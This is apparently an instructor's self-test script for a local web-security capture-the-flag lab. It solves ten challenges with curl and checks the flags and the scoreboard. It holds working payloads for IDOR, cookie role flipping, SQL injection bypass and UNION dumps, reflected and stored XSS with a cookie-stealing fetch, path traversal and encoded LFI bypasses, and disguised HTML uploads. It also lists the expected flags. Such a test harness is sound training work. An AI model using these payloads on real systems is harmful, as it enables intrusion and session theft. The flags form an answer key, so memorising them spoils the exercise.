#!/usr/bin/env bash
# solve_all.sh — instructor self-test: exploit all 10 challenges, check each returns its flag,
# submit every flag, and assert the scoreboard reaches 1750/1750.
#
# ⚠️  RESETS scoreboard.db (it wipes current progress). Uses only curl + python3, 127.0.0.1 only.
#     If the CTF is already running it is reused; otherwise run_all.py is started and stopped.
#
#     The XSS/upload exploits need a browser to run JS. Here curl plays the browser: it checks
#     the payload is served in an executable form, then makes the same /solve request that the
#     payload's JavaScript makes. (Verified separately in headless Chromium.)
set -u
cd "$(dirname "$0")"
H=http://127.0.0.1
ROOT=$(pwd)
cleanup() {
  rm -rf "$TMP"
  if [ -n "${PID:-}" ]; then           # only stop servers this script started
    kill -- -"$PID" 2>/dev/null
    pkill -f "$ROOT/(index|run_all)\.py|$ROOT/challenges/.*/app\.py" 2>/dev/null
  fi
}
TMP=$(mktemp -d); trap cleanup EXIT
PASS=0; FAIL=0

rm -f scoreboard.db
if ! curl -s -o /dev/null "$H:8000/"; then
  setsid python3 run_all.py > "$TMP/run.log" 2>&1 & PID=$!   # own process group -> clean stop
  for _ in $(seq 50); do curl -s -o /dev/null "$H:8010/" && break; sleep 0.2; done
fi

getflag() { grep -oE 'FLAG\{[A-Za-z0-9_]+\}' | head -1; }

check() {   # check <n> <port> <name> <expected-flag> <got-flag>
  local n=$1 port=$2 name=$3 want=$4 got=$5
  if [ "$got" = "$want" ]; then
    curl -s -o /dev/null --data-urlencode "flag=$got" "$H:$port/submit"
    printf '  ✅ %-2s %-34s %s\n' "$n" "$name" "$got"; PASS=$((PASS+1))
  else
    printf '  ❌ %-2s %-34s got: %s\n' "$n" "$name" "${got:-<nothing>}"; FAIL=$((FAIL+1))
  fi
}

echo "Exploiting all challenges..."

# 01 IDOR — log in as 101, read user 102
J="$TMP/j1"; curl -s -c "$J" -o /dev/null -d 'userid=101&password=password101' "$H:8001/login"
F=$(curl -s -b "$J" "$H:8001/account?id=102" | getflag)
check 1 8001 "IDOR — Easy" 'FLAG{idor_h0rizontal_pr1v_esc}' "$F"

# 02 Broken access — robots.txt reveals /admin; flip the role cookie
J="$TMP/j2"; curl -s -c "$J" -o /dev/null -d 'username=ahmed&password=password101' "$H:8002/login"
ADMIN=$(curl -s "$H:8002/robots.txt" | awk '/Disallow: \/admin/{print $2}')
SESS=$(awk '$6=="session"{print $7}' "$J")
F=$(curl -s -b "session=$SESS; role=admin" "$H:8002$ADMIN" | getflag)
check 2 8002 "Broken Access — Hard" 'FLAG{broken_access_vertical_esc}' "$F"

# 03 SQLi login bypass
F=$(curl -s --data-urlencode "username=admin' --" -d 'password=x' "$H:8003/login" | getflag)
check 3 8003 "SQLi — Login Bypass" 'FLAG{sql1_auth_bypass_comment}' "$F"

# 04 SQLi UNION — find column count with ORDER BY, then UNION from secrets
N=0; for i in $(seq 1 10); do
  curl -s -G --data-urlencode "q=' ORDER BY $i --" "$H:8004/" | grep -q 'Database error' && break; N=$i; done
COLS="flag$(printf ',NULL%.0s' $(seq 2 $N))"
F=$(curl -s -G --data-urlencode "q=' UNION SELECT $COLS FROM secrets --" "$H:8004/" | getflag)
check 4 8004 "SQLi — UNION ($N cols)" 'FLAG{un1on_based_data_dump}' "$F"

# 05 Reflected XSS — payload must come back unencoded, then the solve() call it triggers
P='<script>solve()</script>'
if curl -s -G --data-urlencode "q=$P" "$H:8005/" | grep -qF "$P"; then
  PROOF=$(python3 -c 'import sys,urllib.parse as u;print("?"+u.urlencode({"q":sys.argv[1]}))' "$P")
  F=$(curl -s --data-urlencode "proof=$PROOF" "$H:8005/solve" | getflag)
else F=""; fi
check 5 8005 "XSS — Reflected" 'FLAG{r3flected_xss_proven}' "$F"

# 06 Stored XSS — 'script' is blocked; event handler survives; admin bot leaks cookie
curl -s -o /dev/null -X POST "$H:8006/reset"
BLK=$(curl -s -o /dev/null -w '%{redirect_url}' --data-urlencode 'comment=<script>x</script>' -d name=t "$H:8006/comment")
P="<img src=x onerror=fetch('/collect?c='+document.cookie)>"
curl -s -o /dev/null --data-urlencode "comment=$P" -d name=eve "$H:8006/comment"
curl -s -o /dev/null -X POST "$H:8006/admin/visit"
F=$(curl -s "$H:8006/collector" | getflag)
[[ "$BLK" == *blocked* ]] || F="filter-did-not-block-script"
check 6 8006 "XSS — Stored + Filter Bypass" 'FLAG{st0red_xss_filter_bypass}' "$F"

# 07 Path traversal
F=$(curl -s "$H:8007/download?file=../../secret/flag.txt" | getflag)
check 7 8007 "Path Traversal — Easy" 'FLAG{path_traversal_dotdot}' "$F"

# 08 LFI filter bypass — both techniques must work, plain ../ must not
A=$(curl -s "$H:8008/download?file=....//....//secret/flag.txt" | getflag)
B=$(curl -s "$H:8008/download?file=..%2f..%2fsecret%2fflag.txt" | getflag)
PLAIN=$(curl -s "$H:8008/download?file=../../secret/flag.txt" | getflag)
F=""; [ "$A" = "$B" ] && [ -z "$PLAIN" ] && F=$A
check 8 8008 "LFI — Filter Bypass" 'FLAG{lfi_encoded_traversal_bypass}' "$F"

# 09 Unrestricted upload — upload HTML, confirm it's served as text/html, trigger solve()
printf '<script src="/static/ctf.js"></script><script>solve()</script>' > "$TMP/pwn.html"
curl -s -o /dev/null -F "avatar=@$TMP/pwn.html;type=text/html" "$H:8009/upload"
CT=$(curl -s -o /dev/null -w '%{content_type}' "$H:8009/uploads/pwn.html")
F=""; [[ "$CT" == text/html* ]] && \
  F=$(curl -s -H "Referer: $H:8009/uploads/pwn.html" -d 'page=/uploads/pwn.html' "$H:8009/solve" | getflag)
check 9 8009 "Upload — Unrestricted" 'FLAG{unrestricted_upload_served}' "$F"

# 10 Upload bypass — plain .html is blocked; .HtMl + spoofed image/png gets through
BLK=$(curl -s -o /dev/null -w '%{redirect_url}' -F "avatar=@$TMP/pwn.html;type=text/html" "$H:8010/upload")
curl -s -o /dev/null -F "avatar=@$TMP/pwn.html;filename=shell.HtMl;type=image/png" "$H:8010/upload"
CT=$(curl -s -o /dev/null -w '%{content_type}' "$H:8010/uploads/shell.HtMl")
F=""; [[ "$BLK" == *Blocked* && "$CT" == text/html* ]] && \
  F=$(curl -s -H "Referer: $H:8010/uploads/shell.HtMl" -d 'page=/uploads/shell.HtMl' "$H:8010/solve" | getflag)
check 10 8010 "Upload — Filter Bypass" 'FLAG{upload_filter_bypass_exec}' "$F"

# Scoreboard
SCORE=$(curl -s "$H:8000/" | grep -oE '[0-9]+ / [0-9]+' | head -1)
echo
echo "Scoreboard: $SCORE   ($PASS passed, $FAIL failed)"
if [ "$FAIL" -eq 0 ] && [ "$SCORE" = "1750 / 1750" ]; then echo "🏁 ALL 10 SOLVED"; exit 0; fi
echo "Some checks failed."; exit 1
